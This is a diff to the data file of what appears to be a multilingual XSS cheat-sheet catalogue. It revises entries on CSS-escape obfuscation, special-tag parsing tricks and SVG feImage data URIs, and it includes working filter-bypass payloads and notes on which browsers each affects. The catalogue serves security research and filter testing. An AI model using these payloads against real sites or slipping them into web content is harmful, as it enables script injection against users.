@@ -1869,7 +1869,7 @@ var items =
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
@@ -1878,9 +1878,9 @@ var items =
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
-            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (for non-special characters only: \\x = x,\\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). Properties in IE may contain encoded null-character (\\0). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation.',
+            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (note: in CSS-strings \\x = x, but  \\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). Properties in IE may contain encoded null-character (\\0). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation (for example, change case of characters).',
             'ja' : '',
-            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (если при этом они не становятся специальными: \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. В IE свойства могут содержать кодированный нулевой символ (\\0). Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией.',
+            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (внимание в css-строках \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. В IE свойства могут содержать кодированный нулевой символ (\\0). Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией (например, с изменением регистра символов).',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
@@ -1896,7 +1896,7 @@ var items =
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
-        'reporter'   : 'Gareth, LeverOne, Renaud Lifchitz'
+        'reporter'   : 'Gareth, LeverOne, Renaud Lifchitz, .mario'
     },
     { /* ID 62 - Simulating attribute in IE */
         'id'         : 62,
@@ -2813,20 +2813,20 @@ var items =
         'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 91 - Using "attr()" for CSS attack obfuscation */
+    { /* ID 91 - Special tags parsing issues */
         'id'         : 91,
-        'category'   : 'css', 
+        'category'   : 'html', 
         'name'       : {
-            'en' : 'Using "attr()" for CSS attack obfuscation',
+            'en' : 'Special tags parsing issues',
             'ja' : '',
-            'ru' : 'Использование "attr()"',
+            'ru' : 'Особенности разбора спецтегов',
             'de' : ''
         },
-        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style=-o-link:attr(x);-o-link-source:current>X',        
+        'data'       : '[A]\n<? foo="><script>%js_alert%</script>">\n<! foo="><script>%js_alert%</script>">\n</ foo="><script>%js_alert%</script>">\n[B]\n<? foo="><x foo=\'?><script>%js_alert%</script>\'>">\n[C]\n<! foo="["><x foo="]foo><script>%js_alert%</script>">\n[D]\n<% foo><x foo="%><script>%js_alert%</script>">',        
         'description': {
-            'en' : 'Opera supports "attr()" to access attribute values via CSS. Combining that with "-o-link-source" might help bypassing filters.',
+            'en' : 'The HTML tagnames start with a-zA-Z (abstracting from fuzzing). In addition, there are other structures, parsed as a tag (special tags). They begin with the following characters: !,?, /,%. This has its reasons:  DTD, comments, xml-declaration, import-instruction in Internet Explorer, closing tags etc. starts by these characters. These examples show that such tags will inherit some properties of their standard models.\n\n[A] Firefox, Opera, Google Chrome: Parameters of the special tags can not contain a closing parenthesis ">".\n\n[B] Safari: Parameter of the special tags can close only "?>".\n\n[C] Opera: Special tag inherits the properties of DTD: inside it you can create a section that starts with "[" and ends with "]".\n\n[D] Internet Explorer, Safari: A sequence like "<% ... %>" is an alternative to comments.\n\nThese features can be used for obfuscation and bypassing filters. And remember, do not parse as a tag in HTML structure like "<È foo=...>".',
             'ja' : '',
-            'ru' : 'Opera поддерживает "attr()" в качестве значения свойства "-o-link-source". Эта особенность может быть использована для обхода фильтров.',
+            'ru' : 'В HTML имена тегов начинаются с a-zA-Z (если при этом абстрагироваться от возможного напыления). Помимо этого существуют другие конструкции, распознающиеся в качестве тегов (спецтеги). Они начинаются со следующих символов : !, ?, /, % . Этому есть очевидные причины : с этих символов начинаются DTD, комментарии, xml-декларации, инструкции импорта в Internet Explorer, закрывающие теги и т.д. В приведенных ниже примерах мы видим, что спецтеги, несмотря на явные синтаксические отличия от своих стандартных моделей, сохраняют некоторые их свойства.\n\n[A] Firefox, Opera, Google Chrome: Параметр специального тега не может содержать закрывающую скобку (>).\n\n[B] Safari: Параметр может быть прерван только последовательностью ?> .\n\n[C] Opera: Спецтег унаследовал свойсвтво DTD: внутри него можно открыть особую секцию, начинающуюся с [ и оканчивающуюся на ].\n\n[D] Internet Explorer, Safari: Последовательность <% ... %> может быть использована в качестве альтернативы комментариям.\n\nЭти особенности могут быть использованы для обфускации и обхода фильтров. И помните: не следует воспринимать в качестве тегов конструкции, ими в HTML не являющиеся (наподобие <фуфел foo=...>).',
             'de' : ''
         },
         'urls'    : [],
@@ -2837,10 +2837,14 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera' : ['9.x', '10.x', 'mobile']
+            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
+            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.x'], 
+            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'safari': ['3.0', '4.0','5.0']
         },
-        'tags'       : ['xss', 'css', 'opera', 'trick', 'attr'],
-        'reporter'   : 'LeverOne, .mario'
+        'tags'       : ['xss', 'tagname', 'internet explorer', 'opera', 'firefox', 'chrome', 'safari', 'parsing', 'breaking', 'obfscation', 'closing tag'],
+        'reporter'   : 'LeverOne'
     },
     { /* ID 92 - Breaking the functional notation on IE */
         'id'         : 92,
@@ -2929,16 +2933,16 @@ var items =
         'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 95 - Using SVG element <feImage> and data URIs */
+    { /* ID 95 - Using SVG element <feImage> and animated data URIs */
         'id'         : 95,
         'category'   : 'svg',
         'name'       : {
-            'en' : 'Using SVG element <feImage> and data URIs',
+            'en' : 'Using SVG element <feImage> and animated data URIs',
             'ja' : '',
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\r\n<feImage xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D" />\r\n</svg>',        
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>',        
         'description': {
             'en' : 'SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it\'s possible to execute JavaScript without user interaction.',
             'ja' : '',
